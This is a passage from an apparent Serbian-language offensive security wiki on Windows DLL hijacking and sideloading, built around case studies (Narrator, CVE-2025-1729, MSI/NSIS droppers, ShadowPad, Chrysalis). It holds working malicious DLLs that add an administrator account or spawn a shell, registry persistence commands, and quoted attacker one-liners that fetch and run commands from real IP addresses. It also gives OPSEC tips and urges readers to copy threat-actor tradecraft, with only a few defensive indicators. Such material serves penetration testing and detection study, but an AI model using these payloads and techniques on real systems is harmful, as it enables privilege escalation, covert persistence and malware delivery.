<summary>C++ DLL primer sa kreiranjem korisnika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternativni C DLL sa ulaznom tačkom niti</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Studija slučaja: Hijacking DLL-a za lokalizaciju Narrator OneCore TTS (pristupačnost/ATs)

Windows Narrator.exe i dalje pri pokretanju traži predvidljivi DLL za lokalizaciju specifičan za jezik, koji se može hijackovati za proizvoljno izvršavanje koda i uspostavljanje perzistencije.<sup>[[7]](#references)</sup>

Ključne činjenice
- Putanja za pretragu (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Nasleđena putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji DLL koji može da se upisuje i koji kontroliše napadač, on se učitava i izvršava se `DllMain(DLL_PROCESS_ATTACH)`. Nisu potrebni nikakvi export-i.

Otkrivanje pomoću Procmon
- Filter: `Process Name is Narrator.exe` i `Operation is Load Image` ili `CreateFile`.
- Pokrenite Narrator i pratite pokušaj učitavanja navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC tišina
- Naivni hijack će aktivirati govor/istaknuti UI. Da biste ostali neprimetni, pri attach-u nabrojte Narrator thread-ove, otvorite glavni thread (`OpenThread(THREAD_SUSPEND_RESUME)`) i suspendujte ga pomoću `SuspendThread`; nastavite u sopstvenom thread-u. Pogledajte PoC za kompletan kod.<sup>[[8]](#references)</sup>

Pokretanje i postojanost putem Accessibility konfiguracije
- Kontekst korisnika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Uz gorenavedeno, pokretanje Narrator-a učitava ubačeni DLL. Na bezbednoj radnoj površini (ekranu za prijavljivanje), pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na bezbednoj radnoj površini.

Izvršavanje SYSTEM-a pokrenuto putem RDP-a (lateralno kretanje)
- Dozvolite klasični RDP bezbednosni sloj: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se sa hostom putem RDP-a, a na ekranu za prijavljivanje pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na bezbednoj radnoj površini.
- Izvršavanje se zaustavlja kada se RDP sesija zatvori — odmah izvršite inject/migrate.

Bring Your Own Accessibility (BYOA)
- Možete klonirati ugrađeni unos Accessibility Tool (AT) u registru (npr. CursorIndicator), izmeniti ga tako da upućuje na proizvoljni binary/DLL, uvesti ga, a zatim postaviti `configuration` na ime tog AT-a. Time se proizvoljno izvršavanje posreduje kroz Accessibility framework.

Napomene
- Za pisanje u `%windir%\System32` i menjanje vrednosti HKLM potrebna su administratorska prava.
- Sva logika payload-a može biti smeštena u `DLL_PROCESS_ATTACH`; exports nisu potrebni.

## Studija slučaja: CVE-2025-1729 - eskalacija privilegija pomoću TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), evidentiran kao **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe`, smešten u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zakazani zadatak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` pokreće se svakog dana u 9:30 pod kontekstom prijavljenog korisnika.
- **Dozvole direktorijuma**: `CREATOR OWNER` ima dozvolu za pisanje, što lokalnim korisnicima omogućava da ostave proizvoljne fajlove.
- **Ponašanje pri DLL pretrazi**: Najpre pokušava da učita `hostfxr.dll` iz svog radnog direktorijuma i beleži "NAME NOT FOUND" ako fajl nedostaje, što ukazuje na prioritet pretrage u lokalnom direktorijumu.

### Implementacija exploita

Napadač može da postavi zlonamerni `hostfxr.dll` stub u isti direktorijum i iskoristi nedostajući DLL za izvršavanje koda u kontekstu korisnika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Tok napada

1. Kao standardni korisnik, smestite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak pokrene u 9:30, u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL se pokreće u administratorovoj sesiji sa srednjim nivoom integriteta.
4. Kombinujte standardne UAC bypass tehnike da biste prešli sa srednjeg nivoa integriteta na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction dropper + DLL side-loading preko potpisanog hosta (wsc_proxy.exe)

Akteri pretnji često kombinuju MSI dropper-e sa DLL side-loading-om kako bi izvršavali payload-e u okviru pouzdanog, potpisanog procesa.<sup>[[10]](#references)</sup>

Pregled lanca
- Korisnik preuzima MSI. CustomAction se neprimetno pokreće tokom grafičke instalacije (npr. LaunchApplication ili VBScript akcija) i rekonstruiše sledeću fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i zlonamerni DLL u isti direktorijum (primer para: wsc_proxy.exe, potpisan od Avast-a, i wsc.dll pod kontrolom napadača).
- Kada se pokrene potpisani EXE, redosled pretrage DLL-ova u Windows-u prvo učitava wsc.dll iz radnog direktorijuma, čime se izvršava kod napadača u okviru potpisanog roditeljskog procesa (ATT&CK T1574.001).

Analiza MSI-ja (šta tražiti)
- Tabela CustomAction:
  - Potražite unose koji pokreću izvršne datoteke ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji pokreće ugrađenu datoteku u pozadini.
  - U Orca (Microsoft Orca.exe) pregledajte tabele CustomAction, InstallExecuteSequence i Binary.
- Ugrađeni/podeljeni payload-i u MSI CAB-у:
  - Administrativno izdvajanje: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ili koristite lessmsi: lessmsi x package.msi C:\out
  - Potražite više manjih fragmenata koji se konkateniraju i dešifruju pomoću VBScript CustomAction-а. Uobičajen tok:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktičan sideloading pomoću wsc_proxy.exe
- Smestite ove dve datoteke u istu fasciklu:
  - wsc_proxy.exe: legitimni potpisani host (Avast). Proces pokušava da učita wsc.dll po nazivu iz svog direktorijuma.
  - wsc.dll: DLL napadača. Ako nisu potrebni određeni exporti, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exporte pravoj biblioteci, a payload pokrenite u DllMain.
- Napravite minimalni DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Za zahteve za export-ove koristite proxying framework (npr. DLLirant/Spartacus) da biste generisali forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na razrešavanje imena DLL-a od strane host binarne datoteke. Ako host koristi apsolutne putanje ili bezbedne zastavice za učitavanje (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack možda neće uspeti.
- KnownDLLs, SxS i forwarded export-ovi mogu uticati na redosled prioriteta i moraju se uzeti u obzir pri izboru host binarne datoteke i skupa export-ova.

## Potpisani trijadi + šifrovani payload-i (studija slučaja ShadowPad)

Check Point je opisao kako Ink Dragon postavlja ShadowPad koristeći **trijadu od tri fajla** da bi se uklopio u legitimni softver, a pritom zadržao osnovni payload šifrovanim na disku:<sup>[[12]](#references)</sup>

1. **Potpisani host EXE** – zloupotrebljavaju se dobavljači kao što su AMD, Realtek ili NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršnu datoteku tako da liči na Windows binarnu datoteku (na primer, `conhost.exe`), ali Authenticode potpis ostaje važeći.
2. **Zlonamerni loader DLL** – spušta se pored EXE-a pod očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binarna datoteka obfuskirana pomoću ScatterBrain framework-a; njen jedini zadatak je da pronađe šifrovani blob, dešifruje ga i reflektivno mapira ShadowPad.
3. **Šifrovani payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon mapiranja dešifrovanog payload-a u memoriju, loader briše TMP fajl kako bi uništio forenzičke dokaze.

Napomene o tradecraft-u:

* Preimenovanje potpisanog EXE-a (uz zadržavanje originalnog `OriginalFileName` u PE zaglavlju) omogućava mu da se lažno predstavi kao Windows binarna datoteka, a da zadrži potpis dobavljača. Zato kopirajte naviku Ink Dragon-a da postavlja binarne datoteke koje liče na `conhost.exe`, a zapravo su AMD/NVIDIA uslužni programi.
* Pošto izvršna datoteka ostaje pouzdana, većina kontrola za allowlisting zahteva samo da vaš zlonamerni DLL bude smešten pored nje. Usredsredite se na prilagođavanje loader DLL-a; potpisani parent obično može da se pokrene bez izmena.
* ShadowPad-ov decryptor očekuje da TMP blob bude pored loader-a i da može da se u njega upisuje, kako bi mogao da obriše sadržaj fajla nakon mapiranja. Ostavite direktorijum upisivim dok se payload ne učita; kada se učita u memoriju, TMP fajl može bezbedno da se obriše radi OPSEC-a.

### LOLBAS stager + lanac sideloading-a etapno preuzetih arhiva (finger → tar/curl → WMI)

Operateri kombinuju DLL sideloading sa LOLBAS-om, tako da je jedini prilagođeni artefakt na disku zlonamerni DLL pored pouzdanog EXE-a:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Skriveni PowerShell pokreće `cmd.exe /c`, preuzima komande sa Finger servera i prosleđuje ih komandi `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` preuzima tekst preko TCP/79; `| cmd` izvršava odgovor servera, što operaterima omogućava da rotiraju drugi stepen na strani servera.

- **Ugrađeno preuzimanje/raspakivanje:** Preuzmite arhivu sa bezazlenom ekstenzijom, raspakujte je i smestite cilj za sideload i DLL u nasumičnu fasciklu `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` skriva prikaz napretka i prati preusmeravanja; `tar -xf` koristi ugrađeni Windows alat tar.

- **Pokretanje putem WMI/CIM:** Pokrenite EXE putem WMI-ja kako bi telemetrija prikazala proces koji je kreirao CIM dok učitava DLL koji se nalazi u istom direktorijumu:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Radi sa binarnim datotekama koje preferiraju lokalne DLL-ove (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) pokreće se pod pouzdanim imenom.

- **Lov:** Postavite upozorenje za `forfiles` kada se `/p`, `/m` i `/c` pojavljuju zajedno; ta kombinacija je neuobičajena izvan administratorskih skripti.


## Studija slučaja: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavni upad grupe Lotus Blossom zloupotrebio je pouzdan lanac ažuriranja za isporuku droppera upakovanog pomoću NSIS-a, koji je postavio DLL sideload i payload-e koji se u potpunosti izvršavaju u memoriji.<sup>[[13]](#references)</sup>

Tok napada
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, postavlja preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, zlonamerni `log.dll` i šifrovani blob `BluetoothService`, a zatim pokreće EXE.
- Glavni EXE uvozi `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` učitava blob pomoću mmap-a; `LogWrite` ga dešifruje pomoću prilagođenog strim algoritma zasnovanog na LCG-u (konstante **0x19660D** / **0x3C6EF35F**, materijal ključa izveden iz prethodnog hasha), prepisuje bafer plaintext shellcode-om, oslobađa privremene baferе i skače na njega.
- Da bi izbegao IAT, loader pronalazi API-je heširanjem izvoznih naziva pomoću **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, zatim primenjuje avalanche transformaciju u stilu Murmur-a (**0x85EBCA6B**) i poredi rezultat sa heševima ciljeva sa dodatom salt vrednošću.

Glavni shellcode (Chrysalis)
- Dešifruje glavni modul nalik PE-u ponavljanjem operacija add/XOR/sub sa ključem `gQ2JR&9;` tokom pet prolaza, a zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` da dovrši razrešavanje import-a.
- Rekonstruiše stringove naziva DLL-ova tokom izvršavanja pomoću transformacija bit-rotate/XOR za svaki znak, a zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaku izvoznu tabelu u blokovima od 4 bajta uz mešanje u stilu Murmur-a i koristi `GetProcAddress` kao rezervnu opciju samo ako hash nije pronađen.

Ugrađena konfiguracija i C2
- Konfiguracija se nalazi unutar ispuštene datoteke `BluetoothService` na **offsetu 0x30808** (veličina **0x980**) i dešifruje se pomoću RC4 ključa `qwhvb^435h&*7`, otkrivajući C2 URL i User-Agent.
- Beacon-i formiraju profil hosta razdvojen tačkama, dodaju prefiks `4Q`, a zatim ga RC4 šifruju ključem `vAuig34%^325hGV` pre slanja preko HTTPS-a pomoću `HttpSendRequestA`. Odgovori se dešifruju pomoću RC4-a i obrađuju preko switch-a za tagove (`4T` shell, `4V` izvršavanje procesa, `4W/4X` upisivanje datoteke, `4Y` čitanje/eksfiltracija, `4\\` deinstalacija, `4` nabrajanje diskova/datoteka + slučajevi prenosa u segmentima).
- Režim izvršavanja zavisi od argumenata CLI-ja: bez argumenata = instalira persistence (service/Run key) koji upućuje na `-i`; `-i` ponovo pokreće sebe sa `-k`; `-k` preskače instalaciju i pokreće payload.

Uočeni alternativni loader
- Isti upad je postavio Tiny C Compiler i pokrenuo `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. C izvorni kod koji je dostavio napadač sadržao je shellcode, koji je kompajliran i pokrenut u memoriji, bez upisivanja PE datoteke na disk. Ponovite pomoću:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ova faza kompajliranja i pokretanja zasnovana na TCC-u uvezla je `Wininet.dll` tokom izvršavanja i preuzela shellcode druge faze sa hardkodiranog URL-a, čime je obezbedila fleksibilan loader koji se predstavlja kao pokretanje kompajlera.

## Signed-host sideloading with export proxying + host thread parking

Neki DLL sideloading lanci dodaju **stability engineering** kako bi legitimni host ostao aktivan dovoljno dugo da se kasnije faze pravilno učitaju, umesto da se sruši nakon učitavanja zlonamernog DLL-a.<sup>[[11]](#references)</sup>

Uočeni obrazac
- Postavite pouzdani EXE pored zlonamernog DLL-a, koristeći očekivano ime zavisnosti kao što je `version.dll`.
- Zlonamerni DLL **prosleđuje svaki očekivani export** stvarnom sistemskom DLL-u (na primer `%SystemRoot%\\System32\\version.dll`), tako da razrešavanje import-a i dalje uspeva, a host proces nastavlja da radi.
- Nakon učitavanja, zlonamerni DLL **patch-uje entry point hosta** tako da glavna nit ulazi u beskonačnu `Sleep` petlju umesto da se završi ili pokrene putanje koda koje bi prekinule proces.
- Nova nit obavlja stvarni zlonamerni posao: dešifruje ime ili putanju DLL-a sledeće faze (RC4/XOR su česti), a zatim ga pokreće pomoću `LoadLibrary`.

Zašto je ovo važno
- Uobičajeni DLL proxying čuva API kompatibilnost, ali ne garantuje da će host ostati aktivan dovoljno dugo za kasnije faze.
- Parkiranje glavne niti u `Sleep(INFINITE)` jednostavan je način da potpisani proces ostane aktivan dok loader obavlja dešifrovanje, pripremu ili mrežno pokretanje u radnoj niti.
- Lov na sumnjivi `DllMain` može da propusti ovaj obrazac ako se zanimljivo ponašanje dešava nakon što se patch-uje entry point hosta i pokrene sekundarna nit.

Minimalni postupak
1. Kopirajte potpisani host EXE i utvrdite koji DLL učitava iz lokalnog direktorijuma.
2. Napravite proxy DLL koji export-uje iste funkcije i prosleđuje ih legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)` kreirajte radnu nit.
4. Iz te niti patch-ujte entry point hosta ili rutinu pokretanja glavne niti tako da se izvršava petlja sa `Sleep`.
5. Dešifrujte ime/konfiguraciju DLL-a sledeće faze i pozovite `LoadLibrary` ili ručno mapirajte payload.

Odbrambeni pokazatelji
- Potpisani procesi koji učitavaju `version.dll` ili slične uobičajene biblioteke iz sopstvenog direktorijuma aplikacije, a ne iz `System32`.
- Izmene memorije na entry point-u procesa ubrzo nakon učitavanja slike, naročito skokovi/pozivi preusmereni na `Sleep`/`SleepEx`.
- Niti koje kreira proxy DLL i koje odmah pozivaju `LoadLibrary` za drugi DLL sa dešifrovanim imenom.
- Proxy DLL-ovi sa svim export-ima smešteni pored izvršnih datoteka dobavljača unutar direktorijuma za pripremu u koje može da se upisuje, kao što su `ProgramData`, `%TEMP%` ili putanje raspakovanih arhiva.

## References

- [1] [Red Canary – Obaveštajni uvidi: januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Eskalacija privilegija pomoću TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking u Windows-u. Jednostavan C primer.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore raspoređuje novi malware usmeren na Evropu](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Kada se DLL hijack-ovi susretnu sa Windows pomoćnim alatkama](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitalni dvojnici: Anatomija evoluirajućih kampanja lažnog predstavljanja koje distribuiraju Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Preklapanje interesa: Analiza grupa pretnji koje ciljaju vladu jedne države jugoistočne Azije](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Unutar Ink Dragon-a: Otkrivanje relay mreže i unutrašnjeg rada prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: Detaljna analiza Lotus Blossom alata](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack lanac](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Praćenje špijunskih kampanja grupe Iranian APT Screening Serpens iz 2026. godine](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Brzo i žestoko: Operacije Nimbus Manticore tokom iranskog sukoba](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Akcije zadataka](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 cilja vlade i kritičnu infrastrukturu jugoistočne Azije](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
